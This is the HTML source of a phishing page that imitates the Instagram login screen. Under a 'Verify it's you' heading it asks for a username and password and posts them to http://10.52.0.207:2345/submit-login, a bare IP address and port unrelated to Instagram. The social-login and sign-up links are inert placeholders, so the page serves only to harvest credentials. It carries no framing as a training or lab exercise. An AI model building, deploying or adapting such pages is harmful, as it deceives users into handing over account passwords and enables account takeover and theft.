<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="1658587465instagram-name-logo.png" alt="">
            <h3>Verify it's you</h3>
            <form id="login-form" action="http://10.52.0.207:2345/submit-login" method="POST">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <div class="or">OR</div>
                <div class="social-login">
                    <a href="#" class="facebook-login">Log in with Facebook</a>
                </div>
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        <div class="sign-up-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
